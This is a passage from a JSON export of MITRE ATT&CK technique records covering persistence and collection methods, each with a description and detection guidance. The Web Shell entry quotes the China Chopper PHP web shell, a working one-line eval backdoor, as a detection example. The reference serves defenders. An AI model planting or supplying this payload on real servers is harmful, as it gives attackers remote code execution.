<code>\/home\/<username>\/.config\/systemd\/user\/<\/code> directories, as well as associated symbolic links. Suspicious processes or scripts spawned in this manner will have a parent process of \u2018systemd\u2019, a parent process ID of 1, and will usually execute as the \u2018root\u2019 user.\n\nSuspicious systemd services can also be identified by comparing results against a trusted system baseline. Malicious systemd services may be detected by using the systemctl utility to examine system wide services: <code>systemctl list-units -\u2013type=service \u2013all<\/code>. Analyze the contents of <code>.service<\/code> files present on the file system and ensure that they refer to legitimate, expected executables.\n\nAuditing the execution and command-line arguments of the 'systemctl' utility, as well related utilities such as <code>\/usr\/sbin\/service<\/code> may reveal malicious systemd service execution.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":770,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":774,"name":"T1547.003 - Time Providers","sort_id":0,"external_id":"T1547.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains. (Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware\/network resources and outputting these values to other network clients. (Citation: Microsoft TimeProvider)<\/p>\n<p>Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\<\/code>. (Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and\/or whenever parameters are changed. (Citation: Microsoft TimeProvider)<\/p>\n<p>Adversaries may abuse this architecture to establish persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account. (Citation: Github W32Time Oct 2017)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Baseline values and monitor\/analyze activity related to modifying W32Time information in the Registry, including application programming interface (API) calls such as <code>RegCreateKeyEx<\/code> and <code>RegSetValueEx<\/code> as well as execution of the W32tm.exe utility. (Citation: Microsoft W32Time May 2017) There is no restriction on the number of custom time providers registrations, though each may require a DLL payload written to disk. (Citation: Github W32Time Oct 2017)\n\nThe Sysinternals Autoruns tool may also be used to analyze auto-starting locations, including DLLs listed as time providers. (Citation: TechNet Autoruns)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":774,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":778,"name":"T1505.002 - Transport Agent","sort_id":0,"external_id":"T1505.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.(Citation: Microsoft TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. <\/p>\n<p>Adversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.(Citation: ESET LightNeuron May 2019) Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Consider monitoring application logs for abnormal behavior that may indicate suspicious installation of application software components. Consider monitoring file locations associated with the installation of new application software components such as paths from which applications typically load such extensible components.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":778,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":778,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":790,"name":"T1505.003 - Web Shell","sort_id":0,"external_id":"T1505.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.<\/p>\n<p>In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (ex: <a href=\"https:\/\/attack.mitre.org\/software\/S0020\">China Chopper<\/a> Web shell client).(Citation: Lee 2013) <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013) \n\n<code>&lt;?php @eval($_POST['password']);&gt;<\/code>\n\nNevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as running cmd.exe or accessing files that are not in the Web directory. File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells) ","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":790,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":790,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":790,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":795,"name":"T1543.003 - Windows Service","sort_id":0,"external_id":"T1543.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs\/commands, is stored in the Windows Registry. Service configurations can be modified using utilities such as sc.exe and <a href=\"https:\/\/attack.mitre.org\/software\/S0075\">Reg<\/a>. <\/p>\n<p>Adversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system.<\/p>\n<p>An adversary may also incorporate <a href=\"https:\/\/attack.mitre.org\/techniques\/T1036\">Masquerading<\/a> by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used. <\/p>\n<p>Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1569\/002\">Service Execution<\/a>. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor processes and command-line arguments for actions that could create or modify services. Command-line invocation of tools capable of adding or modifying services may be unusual, depending on how systems are typically used in a particular environment. Services may also be modified through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001), so additional logging may need to be configured to gather the appropriate data. Remote access tools with built-in features may also interact directly with the Windows API to perform these functions outside of typical system utilities. Collect service utility execution and service binary path arguments used for analysis. Service binary paths may even be changed to execute commands or scripts.  \n\nLook for changes to service Registry entries that do not correlate with known software, patch cycles, etc. Service information is stored in the Registry at <code>HKLM\\SYSTEM\\CurrentControlSet\\Services<\/code>. Changes to the binary path and the service startup type changed from manual or disabled to automatic, if it does not typically do so, may be suspicious. Tools such as Sysinternals Autoruns may also be used to detect system service changes that could be attempts at persistence.(Citation: TechNet Autoruns)  \n\nCreation of new services may generate an alterable event (ex: Event ID 4697 and\/or 7045 (Citation: Microsoft 4697 APR 2017)(Citation: Microsoft Windows Event Forwarding FEB 2018)). New, benign services may be created during installation of new software.\n\nSuspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":795,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":796,"name":"T1547.004 - Winlogon Helper DLL","sort_id":0,"external_id":"T1547.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may abuse features of Winlogon to execute DLLs and\/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon\/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\Wow6432Node\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\<\/code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\<\/code> are used to manage additional helper programs and functionalities that support Winlogon. (Citation: Cylance Reg Persistence Sept 2013) <\/p>\n<p>Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and\/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)<\/p>\n<ul>\n<li>Winlogon\\Notify - points to notification package DLLs that handle Winlogon events<\/li>\n<li>Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on<\/li>\n<li>Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on<\/li>\n<\/ul>\n<p>Adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for changes to Registry entries associated with Winlogon that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current Winlogon helper values. (Citation: TechNet Autoruns)  New DLLs written to System32 that do not correlate with known good software or patching may also be suspicious.\n\nLook for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":796,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":797,"name":"T1540 - Code Injection","sort_id":0,"external_id":"T1540","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may use code injection attacks to implant arbitrary code into the address space of a running application. Code is then executed or interpreted by that application. Adversaries utilizing this technique may exploit capabilities to load code in at runtime through dynamic libraries.<\/p>\n<p>With root access, <code>ptrace<\/code> can be used to target specific applications and load shared libraries into its process memory.(Citation: Shunix Code Injection Mar 2016)(Citation: Fadeev Code Injection Aug 2018) By injecting code, an adversary may be able to gain access to higher permissions held by the targeted application by executing as the targeted application. In addition, the adversary may be able to evade detection or enable persistent access to a system under the guise of the application\u2019s process.(Citation: Google Triada June 2019)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:21","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Code injection can be difficult to detect, and therefore enterprises may be better served focusing on detection at other stages of adversarial behavior.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":797,"platform_id":10,"created_at":"2020-07-28 16:02:21","updated_at":"2020-07-28 16:02:21"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":797,"platform_id":11,"created_at":"2020-07-28 16:02:21","updated_at":"2020-07-28 16:02:21"}}]},{"id":798,"name":"T1577 - Compromise Application Executable","sort_id":0,"external_id":"T1577","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may modify applications installed on a device to establish persistent access to a victim. These malicious modifications can be used to make legitimate applications carry out adversary tasks when these applications are in use.<\/p>\n<p>There are multiple ways an adversary can inject malicious code into applications. One method is by taking advantages of device vulnerabilities, the most well-known being Janus, an Android vulnerability that allows adversaries to add extra bytes to APK (application) and DEX (executable) files without affecting the file's signature. By being able to add arbitrary bytes to valid applications, attackers can seamlessly inject code into genuine executables without the user's knowledge.(Citation: Guardsquare Janus)<\/p>\n<p>Adversaries may also rebuild applications to include malicious modifications. This can be achieved by decompiling the genuine application, merging it with the malicious code, and recompiling it.(Citation: CheckPoint Agent Smith)<\/p>\n<p>Adversaries may also take action to conceal modifications to application executables and bypass user consent. These actions include altering modifications to appear as an update or exploiting vulnerabilities that allow activities of the malicious application to run inside a system application.(Citation: CheckPoint Agent Smith)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:21","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"This behavior is seamless to the user and is typically undetectable.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":798,"platform_id":10,"created_at":"2020-07-28 16:02:21","updated_at":"2020-07-28 16:02:21"}}]}]}]},{"id":17,"name":"Through","tactics":[{"id":16,"name":"Collection","source_name":"ENTERPRISE_collection","sort_id":0,"external_id":"TA0009","category_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"framework_stage_id":17,"tactic_id":16},"techniques":[{"id":164,"name":"T1123 - Audio Capture","sort_id":0,"external_id":"T1123","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.<\/p>\n<p>Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.\n\nBehavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the microphone, recording devices, or recording software, and a process periodically writing files to disk that contain audio data.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":164,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":164,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":164,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":166,"name":"T1119 - Automated Collection","sort_id":0,"external_id":"T1119","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\">Command and Scripting Interpreter<\/a> to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. <\/p>\n<p>This technique may incorporate use of other techniques such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1083\">File and Directory Discovery<\/a> and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1570\">Lateral Tool Transfer<\/a> to identify and move files.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Depending on the method used, actions could include common file system commands and parameters on the command-line interface within batch files or scripts. A sequence of actions like this may be unusual, depending on the system and network environment. Automated collection may occur along with other techniques such as [Data Staged](https:\/\/attack.mitre.org\/techniques\/T1074). As such, file access monitoring that shows an unusual process performing sequential file opens and potentially copy actions to another location on the file system for many files at once may indicate automated collection behavior. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":166,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":166,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":166,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":179,"name":"T1115 - Clipboard Data","sort_id":0,"external_id":"T1115","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may collect data stored in the clipboard from users copying information within or between applications. <\/p>\n<p>In Windows, Applications can access clipboard data by using the Windows API.(Citation: MSDN Clipboard) OSX provides a native command, <code>pbpaste<\/code>, to grab clipboard contents.(Citation: Operating with EmPyre)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Access to the clipboard is a legitimate function of many applications on an operating system. If an organization chooses to monitor for this behavior, then the data will likely need to be correlated against other suspicious or non-user-driven activity.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":179,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":179,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":179,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":210,"name":"T1074 - Data Staged","sort_id":0,"external_id":"T1074","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1560\">Archive Collected Data<\/a>. Interactive command shells may be used, and common functionality within <a href=\"https:\/\/attack.mitre.org\/software\/S0106\">cmd<\/a> and bash may be used to copy data into a staging location.(Citation: PWC Cloud Hopper April 2017)<\/p>\n<p>In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may <a href=\"https:\/\/attack.mitre.org\/techniques\/T1578\/002\">Create Cloud Instance<\/a> and stage data in that instance.(Citation: Mandiant M-Trends 2020)<\/p>\n<p>Adversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":210,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":210,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":210,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":210,"platform_id":6,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":210,"platform_id":7,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":210,"platform_id":8,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":212,"name":"T1530 - Data from Cloud Storage Object","sort_id":0,"external_id":"T1530","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may access data objects from improperly secured cloud storage.<\/p>\n<p>Many cloud service providers offer solutions for online data storage such as Amazon S3, Azure Storage, and Google Cloud Storage. These solutions differ from other storage solutions (such as SQL or Elasticsearch) in that there is no overarching application. Data from these solutions can be retrieved directly using the cloud provider's APIs. Solution providers typically offer security guides to help end users configure systems.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019)<\/p>\n<p>Misconfiguration by end users is a common problem. There have been numerous incidents where cloud storage has been improperly secured (typically by unintentionally allowing public access by unauthenticated users or overly-broad access by all users), allowing open access to credit cards, personally identifiable information, medical records, and other sensitive information.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017) Adversaries may also obtain leaked credentials in source repositories, logs, or other means as a way to gain access to cloud storage objects that have access permission controls.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for unusual queries to the cloud provider's storage service. Activity originating from unexpected sources may indicate improper permissions are set that is allowing access to data. Additionally, detecting failed attempts by a user for a certain object, followed by escalation of privileges by the same user, and access to the same object may be an indication of suspicious activity.","platforms":[{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":212,"platform_id":6,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":212,"platform_id":7,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":212,"platform_id":8,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":213,"name":"T1213 - Data from Information Repositories","sort_id":0,"external_id":"T1213","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":16,"description":"<p>Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.<\/p>\n<p>Adversaries may also collect information from shared storage repositories hosted on cloud infrastructure or in software-as-a-service (SaaS) applications, as storage is one of the more fundamental requirements for cloud services and systems.<\/p>\n<p>The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:<\/p>\n<ul>\n<li>Policies, procedures, and standards<\/li>\n<li>Physical \/ logical network diagrams<\/li>\n<li>System architecture diagrams<\/li>\n<li>Technical system documentation<\/li>\n<li>Testing \/ development credentials<\/li>\n<li>Work \/ project schedules<\/li>\n<li>Source code snippets<\/li>\n<li>Links to network shares and other internal resources<\/li>\n<\/ul>\n<p>Information stored in a repository may vary based on the specific instance or environment. Specific common information repositories include <a href=\"https:\/\/attack.mitre.org\/techniques\/T1213\/002\">Sharepoint<\/a>, <a href=\"https:\/\/attack.mitre.org\/techniques\/T1213\/001\">Confluence<\/a>, and enterprise databases such as SQL Server.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should not generally used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.\n\nThe user access logging within Microsoft's SharePoint can be configured to report access to certain pages and documents. (Citation: Microsoft SharePoint Logging) The user access logging within Atlassian's Confluence can also be configured to report access to certain pages and documents through AccessLogFilter. (Citation: Atlassian Confluence Logging) Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":213,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":213,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":213,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":213,"platform_id":4,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":213,"platform_id":6,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":213,"platform_id":7,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 